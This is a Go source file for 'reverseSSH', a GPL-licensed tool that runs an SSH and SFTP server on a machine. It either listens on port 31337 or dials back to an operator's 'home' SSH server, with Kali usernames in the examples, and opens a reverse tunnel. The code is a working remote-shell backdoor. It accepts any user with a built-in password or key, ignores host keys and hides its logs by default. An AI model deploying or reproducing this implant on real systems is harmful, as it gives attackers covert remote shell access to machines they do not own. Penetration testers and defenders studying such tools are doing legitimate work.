// reverseSSH - a lightweight ssh server with a reverse connection feature
// Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package main

import (
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"path"
	"strings"
	"syscall"

	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
)

type params struct {
	LUSER        string
	LADDR        string
	LPORT        uint
	homeBindPort uint
	shell        string
	bindAddr     string
	verbose      bool
}

func SFTPHandler(s ssh.Session) {
	server, err := sftp.NewServer(s)
	if err != nil {
		log.Printf("Sftp server init error: %s\n", err)
		return
	}

	log.Printf("New sftp connection from %s", s.RemoteAddr().String())
	if err := server.Serve(); err == io.EOF {
		server.Close()
		log.Println("Sftp connection closed by client")
	} else if err != nil {
		log.Println("Sftp server exited with error:", err)
	}
}

func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool) (net.Listener, error) {
	var (
		err    error
		client *gossh.Client
	)

	config := &gossh.ClientConfig{
		User: username,
		Auth: []gossh.AuthMethod{
			gossh.Password(localPassword),
		},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
	}

	// Attempt to connect with localPassword initially and keep asking for password on failure
	for {
		client, err = gossh.Dial("tcp", address, config)
		if err == nil {
			break
		} else if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
			fmt.Println("Enter password:")
			data, err := terminal.ReadPassword(int(syscall.Stdin))
			if err != nil {
				log.Println(err)
				continue
			}

			config.Auth = []gossh.AuthMethod{
				gossh.Password(string(data)),
			}
		} else {
			return nil, err
		}
	}

	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", homeBindPort))
	if err != nil {
		return nil, err
	}

	log.Printf("Success: listening on port %d at home", homeBindPort)
	return ln, nil
}

func setupParameters() *params {
	var help = fmt.Sprintf(`reverseSSH %[2]s  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

Usage: %[1]s [options] [<user>@]<target>

Examples:
  Bind:
	%[1]s
	%[1]s -v -l :4444
  Reverse:
	%[1]s 192.168.0.1
	%[1]s kali@192.168.0.1
	%[1]s -p 31337 192.168.0.1
	%[1]s -v -b 0 kali@192.168.0.2

Options:
	-s, Shell to use for incoming connections, e.g. /bin/bash; (default: %[5]s)
		for windows this can only be used to give a path to 'ssh-shellhost.exe' to
		enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
	-l, Bind scenario only: listen at this address:port (default: :31337)
	-p, Reverse scenario only: ssh port at home (default: 22)
	-b, Reverse scenario only: bind to this port after dialling home (default: 8888)
	-v, Emit log output

<target>
	Optional target which enables the reverse scenario. Can be prepended with
	<user>@ to authenticate as a different user than 'reverse' while dialling home.

Credentials:
	Accepting all incoming connections from any user with either of the following:
	 * Password "%[3]s"
	 * PubKey   "%[4]s"
`, path.Base(os.Args[0]), version, localPassword, authorizedKey, defaultShell)

	flag.Usage = func() {
		fmt.Print(help)
		os.Exit(1)
	}

	p := params{}

	flag.UintVar(&p.LPORT, "p", 22, "")
	flag.UintVar(&p.homeBindPort, "b", 8888, "")
	flag.StringVar(&p.shell, "s", defaultShell, "")
	flag.StringVar(&p.bindAddr, "l", ":31337", "")
	flag.BoolVar(&p.verbose, "v", false, "")
	flag.Parse()

	if !p.verbose {
		log.SetOutput(ioutil.Discard)
	}

	switch len(flag.Args()) {
	case 0:
		p.LADDR = ""
	case 1:
		target := strings.Split(fmt.Sprintf("%s:%d", flag.Args()[0], p.LPORT), "@")
		switch len(target) {
		case 1:
			p.LUSER = "reverse"
			p.LADDR = target[0]
		case 2:
			p.LUSER = target[0]
			p.LADDR = target[1]
		default:
			log.Fatalf("Could not parse '%s'", target)
		}

	default:
		log.Println("Invalid arguments, check usage!")
		os.Exit(1)
	}

	return &p
}

func run(p *params, server ssh.Server) {
	var (
		ln  net.Listener
		err error
	)

	if p.LADDR == "" {
		log.Printf("Starting ssh server on %s", p.bindAddr)
		ln, err = net.Listen("tcp", p.bindAddr)
	} else {
		log.Printf("Dialling home via ssh to %s", p.LADDR)
		ln, err = dialHomeAndListen(p.LUSER, p.LADDR, p.homeBindPort, p.verbose)
	}

	if err != nil {
		log.Fatal(err)
	}
	defer ln.Close()
	log.Fatal(server.Serve(ln))
}
